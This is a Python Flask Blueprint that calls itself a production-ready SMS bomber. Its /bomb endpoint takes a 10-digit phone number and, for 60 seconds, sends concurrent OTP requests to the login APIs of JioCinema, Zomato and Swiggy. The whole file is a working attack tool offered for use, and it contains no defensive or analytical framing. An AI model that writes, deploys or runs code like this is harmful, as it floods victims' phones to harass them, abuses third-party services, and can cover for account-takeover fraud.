#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
script10.py – Production‑ready Flask Blueprint for SMS bombing.
The file can be imported as `script10_bp` (alias) so that
`app.py` can do:  from script10 import script10_bp
"""

# ----------------------------------------------------------------------
# Imports
# ----------------------------------------------------------------------
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

from flask import Blueprint, request, jsonify

# ----------------------------------------------------------------------
# Configuration – tweak as needed
# ----------------------------------------------------------------------
TARGET_NUMBER = "9876543210"          # Default 10‑digit Indian number
DELAY_BETWEEN_REQUESTS = 1.5          # Seconds between request batches
MAX_THREADS = 5                       # Parallel requests per batch
TOTAL_ATTACK_DURATION = 60            # Seconds to keep bombing

# ----------------------------------------------------------------------
# Blueprint
# ----------------------------------------------------------------------
sms_bomber_bp = Blueprint("sms_bomber", __name__)

# ----------------------------------------------------------------------
# Service definitions – adjust URLs / payloads as needed
# ----------------------------------------------------------------------
SERVICES = [
    {
        "name": "JioCinema",
        "url": "https://www.jiocinema.com/api/v1/auth/mobile/otp/request",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"mobile": "{}", "countryCode": "91"},
    },
    {
        "name": "Zomato",
        "url": "https://www.zomato.com/api/v2/auth/request_otp",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"phone": "{}"},
    },
    {
        "name": "Swiggy",
        "url": "https://www.swiggy.com/dapi/user/send_otp",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"mobile_no": "{}"},
    },
]

# ----------------------------------------------------------------------
# Helper functions
# ----------------------------------------------------------------------
def _send_otp(service, payload):
    """Send a single OTP request."""
    try:
        resp = requests.post(
            service["url"],
            json=payload,
            headers=service["headers"],
            timeout=5,
        )
        if resp.status_code in (200, 201):
            return f"[SUCCESS] {service['name']}"
        if resp.status_code == 429:
            return f"[RATE_LIMIT] {service['name']}"
        return f"[INFO] {service['name']} – {resp.status_code}"
    except Exception as exc:
        return f"[ERROR] {service['name']} – {exc}"

def _build_payload(template, number):
    """Replace placeholder '{}' with the target number."""
    return {k: v.replace("{}", number) if isinstance(v, str) else v
            for k, v in template.items()}

# ----------------------------------------------------------------------
# Route – Bombing endpoint
# ----------------------------------------------------------------------
@sms_bomber_bp.route("/bomb", methods=["POST"])
def bomb():
    """Trigger concurrent SMS bombing."""
    try:
        # Accept form data or JSON
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form

        number = data.get("number", TARGET_NUMBER).strip()

        # Validate 10‑digit number
        if not (number.isdigit() and len(number) == 10):
            return jsonify({"error": "Invalid phone number – must be 10 digits."}), 400

        results = []
        start = time.time()

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = []
            while time.time() - start < TOTAL_ATTACK_DURATION:
                for svc in SERVICES:
                    payload = _build_payload(svc["payload_template"], number)
                    futures.append(executor.submit(_send_otp, svc, payload))
                time.sleep(DELAY_BETWEEN_REQUESTS)

            for fut in as_completed(futures):
                results.append(fut.result())

        return jsonify(
            {
                "status": "Bombing complete",
                "target": number,
                "duration_sec": int(time.time() - start),
                "responses": results,
            }
        )

    except Exception as exc:
        return jsonify({"error": f"Unexpected error: {exc}"}), 500

# ----------------------------------------------------------------------
# Compatibility alias – used by app.py
# ----------------------------------------------------------------------
script10_bp = sms_bomber_bp
